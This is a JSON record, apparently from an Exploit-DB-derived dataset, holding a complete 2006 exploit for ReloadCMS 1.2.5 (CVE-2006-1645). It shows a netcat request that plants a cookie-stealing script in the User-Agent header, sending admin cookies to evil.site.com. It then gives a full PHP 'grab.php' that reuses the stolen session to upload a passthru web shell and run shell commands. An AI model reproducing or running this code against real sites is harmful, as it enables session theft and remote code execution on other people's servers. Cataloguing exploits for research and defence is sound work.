{
  "id": "1631",
  "title": "ReloadCMS 1.2.5 - Cross-Site Scripting / Remote Code Execution",
  "cve": "CVE-2006-1645",
  "vuln_type": "xss_reflected",
  "code": "<?php\r\n/*\r\nReloadCMS <= 1.2.5stable Cross site scripting / remote command execution\r\n\r\nsoftware site: http://reloadcms.com/\r\ndescription: \"ReloadCMS is a free CMS written on PHP and based on flat files.\"\r\n\r\nvulnerability:\r\nReloadCMS do not properly sanitize User-Agent request header before to store it\r\nin stats.dat file.\r\nExample of an attack, through netcat:\r\n\r\nrgod>nc target.host.com 80\r\nGET /path_to_reloadcms/ HTTP/1.0\r\nUser-Agent: \"><script>window.open(\"http://evil.site.com/grab.php?c=\"+document.cookie+\"&ref=\"+document.URL);window.close();</script>\r\nHost: target.host.com\r\nConnection: Close\r\n\r\nSo, when admin see site statistics through the administration panel, javascript\r\nwill run\r\n\r\nOnce grab.php script captures admin cookie, the script itself can upload a shell\r\ntrough filemanager, launch commands and write output to a logfile also, inside\r\ncookies, there is admin MD5 password hash\r\n\r\nrgod\r\nmail: rgod@autistici.org\r\nsite: http://retrogod.altervista.org\r\n\t\t\t\t\t\t\t                      */\r\n\r\n#--------------------------------grab.php---------------------------------------\r\n#cookie grabber / backdoor install\r\n\r\n$cmd=\"uname -a\"; //a shell command, leave empty to lauch commands later trough suntzu.php\r\n$proxy=\"\"; //you can use a proxy (ip:port), otherwise leave empty\r\n$logfile=\"log.txt\";\r\n$filename=\"suntzu.php\"; //shell filename\r\n\r\nerror_reporting(0);\r\nignore_user_abort(1);\r\nini_set(\"max_execution_time\",0);\r\n\r\n//log referer and cookies\r\n$fp=fopen($logfile,\"a\");\r\nfputs($fp,$_GET['ref'].\"|\".$_GET['c'].\"\\r\\n\");\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n\r\n$temp=explode(\"/\",$_GET['ref']);\r\n$host=$temp[2];\r\n$path=\"\";\r\nif (count($temp)>4)\r\n{\r\nfor ($i=3; $i<=count($temp)-2; $i++)\r\n{$path.=\"/\".$temp[$i];}\r\n}\r\n$path.=\"/\";\r\n$port=80;\r\n\r\n#step 1 -> Get full application path, it is inside html, you need this to upload a shell\r\n$packet =\"GET \".$path.\"admin.php?show=module&id=general.filemanager HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Cookie: \".$_GET[c].\";\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n\r\n#step 2 -> Upload the evil code\r\n$temp=explode('name=\"path\" value=\"',$html);\r\n$temp2=explode(\"\\\"\",$temp[1]);\r\n$fullpath=$temp2[0];\r\n$shell='<?php error_reporting(0);ini_set(\"max_execution_time\",0);if (get_magic_quotes_gpc()){$_GET[cmd]=stripslashes($_GET[cmd]);}passthru($_GET[cmd]);?>';\r\n$data=\"-----------------------------7d529a1d23092a\\r\\n\";\r\n$data.=\"Content-Disposition: form-data; name=\\\"upload\\\"; filename=\\\"$filename\\\"\\r\\n\";\r\n$data.=\"Content-Type:\\r\\n\\r\\n\";\r\n$data.=\"$shell\\r\\n\";\r\n$data.=\"-----------------------------7d529a1d23092a\\r\\n\";\r\n$data.=\"Content-Disposition: form-data; name=\\\"path\\\"\\r\\n\\r\\n\";\r\n$data.=\"$fullpath\\r\\n\";\r\n$data.=\"-----------------------------7d529a1d23092a\\r\\n\";\r\n$data.=\"Content-Disposition: form-data; name=\\\"test\\\"\\r\\n\\r\\n\";\r\n$data.=\"Upload\\r\\n\";\r\n$data.=\"-----------------------------7d529a1d23092a--\\r\\n\";\r\n$packet =\"POST \".$path.\"admin.php?show=module&id=general.filemanager HTTP/1.0\\r\\n\";\r\n$packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\\r\\n\";\r\n$packet.=\"User-Agent: Googlebot/2.1\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Cookie: \".$_GET[c].\";\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n\r\n$packet =\"GET \".$path.\"suntzu.php?cmd=\".urlencode($cmd).\" HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n\r\n//log output\r\nfputs($fp,\"suntzu>\".$cmd.\"\\r\\n\");\r\nfputs($fp,\"\\r\\n\".$html.\"\\r\\n\");\r\nfclose($fp);\r\nheader (\"Location: \".$_GET['ref']);\r\n?>\r\n\r\n# milw0rm.com [2006-04-02]",
  "url": "https://www.exploit-db.com/exploits/1631"
}